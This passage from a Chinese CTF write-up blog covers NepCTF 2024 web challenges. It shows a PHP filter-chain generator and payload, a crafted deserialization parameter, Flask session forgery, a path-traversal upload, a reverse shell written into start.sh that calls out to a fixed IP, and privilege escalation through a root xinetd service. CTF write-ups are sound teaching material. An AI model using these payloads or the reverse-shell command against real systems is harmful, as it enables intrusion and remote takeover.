+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;n&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;o&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;p&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;q&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;r&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;s&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;t&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;u&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;v&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO_6937-2:1983.R9|convert.iconv.OSF00010005.IBM-932&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;w&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;x&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;y&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;z&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937&#39;</span>,
+</span></span><span style=display:flex><span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$filters <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;convert.base64-encode|&#34;</span>;
+</span></span><span style=display:flex><span><span style=color:#75715e># make sure to get rid of any equal signs in both the string we just generated and the rest of the file
+</span></span></span><span style=display:flex><span>$filters <span style=color:#f92672>.=</span> <span style=color:#e6db74>&#34;convert.iconv.UTF8.UTF7|&#34;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>foreach</span> (<span style=color:#a6e22e>str_split</span>(<span style=color:#a6e22e>strrev</span>($base64_payload)) <span style=color:#66d9ef>as</span> $c) {
+</span></span><span style=display:flex><span>    $filters <span style=color:#f92672>.=</span> $conversions[$c] <span style=color:#f92672>.</span> <span style=color:#e6db74>&#34;|&#34;</span>;
+</span></span><span style=display:flex><span>    $filters <span style=color:#f92672>.=</span> <span style=color:#e6db74>&#34;convert.base64-decode|&#34;</span>;
+</span></span><span style=display:flex><span>    $filters <span style=color:#f92672>.=</span> <span style=color:#e6db74>&#34;convert.base64-encode|&#34;</span>;
+</span></span><span style=display:flex><span>    $filters <span style=color:#f92672>.=</span> <span style=color:#e6db74>&#34;convert.iconv.UTF8.UTF7|&#34;</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$filters <span style=color:#f92672>.=</span> <span style=color:#e6db74>&#34;convert.base64-decode&#34;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$final_payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;php://filter/</span><span style=color:#e6db74>{</span>$filters<span style=color:#e6db74>}</span><span style=color:#e6db74>/resource=index.php&#34;</span>;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> $final_payload;
+</span></span></code></pre></div><p>得到答案最后就是</p><p>Get传参</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>?c=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00&#34;;s:3:&#34;str&#34;;O:1:&#34;B&#34;:1:{s:1:&#34;b&#34;;a:2:{i:0;O:1:&#34;A&#34;:1:{s:3:&#34;key&#34;;S:5:&#34;\00key\00&#34;;}i:1;s:8:&#34;readflag&#34;;}}}&amp;nep1=%f0abc%f0abc%f0abc%f0abc%9f%9f&amp;nep=Nep
+</span></span></code></pre></div><p>post传参</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>1<span style=color:#f92672>=</span>php://filter/convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource<span style=color:#f92672>=</span>index.php
+</span></span></code></pre></div><p>最后通过<code>?cmd=system('env');</code>得到flag</p><p><img alt=php4 loading=lazy src=/posts/ctf/nepctf2024/php4.png></p><h2 id=蹦蹦炸弹boom_it>蹦蹦炸弹（boom_it）</h2><p>审计一下代码，直接给了secret_key,用户是HRP，flask伪造session</p><p><img alt=boom1 loading=lazy src=/posts/ctf/nepctf2024/boom1.png></p><p>随便写个前端上传个文件再修改一下内容为../../lock.txt</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE html&gt;</span>
+</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>html</span> <span style=color:#a6e22e>lang</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;en&#34;</span>&gt;
+</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>head</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>meta</span> <span style=color:#a6e22e>charset</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;UTF-8&#34;</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>meta</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;viewport&#34;</span> <span style=color:#a6e22e>content</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>title</span>&gt;POST数据包POC&lt;/<span style=color:#f92672>title</span>&gt;
+</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>head</span>&gt;
+</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>body</span>&gt;
+</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>form</span> <span style=color:#a6e22e>action</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;https://neptune-29348.nepctf.lemonprefect.cn/admin/dashboard&#34;</span> <span style=color:#a6e22e>method</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;post&#34;</span> <span style=color:#a6e22e>enctype</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;multipart/form-data&#34;</span>&gt;
+</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!--链接是当前打开的题目链接--&gt;</span>
+</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>label</span> <span style=color:#a6e22e>for</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;file&#34;</span>&gt;文件名：&lt;/<span style=color:#f92672>label</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;file&#34;</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;file&#34;</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;file&#34;</span>&gt;&lt;<span style=color:#f92672>br</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;submit&#34;</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;submit&#34;</span> <span style=color:#a6e22e>value</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;提交&#34;</span>&gt;
+</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>form</span>&gt;
+</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>body</span>&gt;
+</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>html</span>&gt;
+</span></span></code></pre></div><p>只有就有File uploaded successfully</p><p>然后改回GET，尝试?cmd=ls</p><p><img alt=boom2 loading=lazy src=/posts/ctf/nepctf2024/boom2.png></p><p>尝试读取flag发现并不能读取，发现start.sh可写入，尝试反弹shell</p><p><code>?cmd=echo+"bash+-i+>%26+/dev/tcp/8.130.42.113/8888+0>%261"+>+start.sh</code></p><p><code>?cmd=bash+start.sh</code></p><p>进去发现是root权限才能读出</p><p><img alt=boom3 loading=lazy src=/posts/ctf/nepctf2024/boom3.png></p><p>执行命令<code>ps -aux</code></p><p>可以看到一个<code>/usr/sbin/xinetd</code>是由root权限得到的</p><p>查看<code>etc/xinetd.d/</code>看到pwnservice里面有个端口8888,并且这个可以写入，可以尝试利用8888进行连接</p><p>这里继续看晨曦师傅的wp</p><p>我是需要<code>echo "./pwn;chmod 777 /home/ctfuser/*" >> /home/ctfuser/start.sh"</code>这里改为最大权限</p><p>然后nc 127.0.0.1 8888,(<code>python3 -c "import socket;sock = socket.socket();sock.connect(('127.0.0.1', 8888));"</code>)随后<code>ls -al</code>可以发现flag是可以打开的了，可以cat flag</p><p><img alt=boom4 loading=lazy src=/posts/ctf/nepctf2024/boom4.png></p><hr><p>复盘就到这了，剩下的有些知识点确实完全不知道，等下学期好好恶补一下，第一次打nep学到了很多东西。</p></div></div></div><button id=tocFab class=toc-fab type=button aria-label="Toggle TOC">目录</button><aside id=tocDrawer class=toc-drawer aria-hidden=true><div class=toc-drawer-head><div class=toc-drawer-title>目录</div><button id=tocClose class=toc-close type=button aria-label="Close TOC">×</button></div><nav class=toc-drawer-body><nav id=TableOfContents><ul><li><a href=#misc>Misc</a><ul><li><a href=#nemophila>Nemophila</a></li><li><a href=#nepmagic--checkin>NepMagic —— CheckIn</a></li><li><a href=#3dnep>3DNep</a></li><li><a href=#nepcamera>NepCamera</a></li></ul></li><li><a href=#hardware>Hardware</a></li><li><a href=#web>Web</a><ul><li><a href=#nepdouble>NepDouble</a></li><li><a href=#php_master>PHP_MASTER!!</a><ul><li><a href=#非预期>非预期</a></li><li><a href=#预期>预期</a></li></ul></li><li><a href=#蹦蹦炸弹boom_it>蹦蹦炸弹（boom_it）</a></li></ul></li></ul></nav></nav></aside><script>(function(){const s=document.getElementById("tocFab"),e=document.getElementById("tocDrawer"),o=document.getElementById("tocClose");if(!s||!e)return;const t="pm_toc_open";function i(){e.classList.add("open"),e.setAttribute("aria-hidden","false");try{localStorage.setItem(t,"1")}catch{}}function n(){e.classList.remove("open"),e.setAttribute("aria-hidden","true");try{localStorage.setItem(t,"0")}catch{}}function a(){e.classList.contains("open")?n():i()}s.addEventListener("click",a),o&&o.addEventListener("click",n),document.addEventListener("keydown",e=>{e.key==="Escape"&&n()});try{localStorage.getItem(t)==="1"&&i()}catch{}})()</script><nav class=paginav><a class=prev href=http://localhost:1313/posts/ctf/moectf2024/><span class=title>«</span><br><span>moectf2024</span>
+</a><a class=next href=http://localhost:1313/posts/ctf/basectf2024/><span class=title>»</span><br><span>Basectf2024</span></a></nav></article></main><footer class=footer><span>© 2026
+<a href=http://localhost:1313/>0raN9e's Blog</a>· Powered by <a href=https://gohugo.io/>Hugo</a> &
+<a href=https://github.com/adityatelange/hugo-PaperMod>PaperMod</a>· adapted by <span style=letter-spacing:.12em>0ran9e</span></span></footer></body></html>
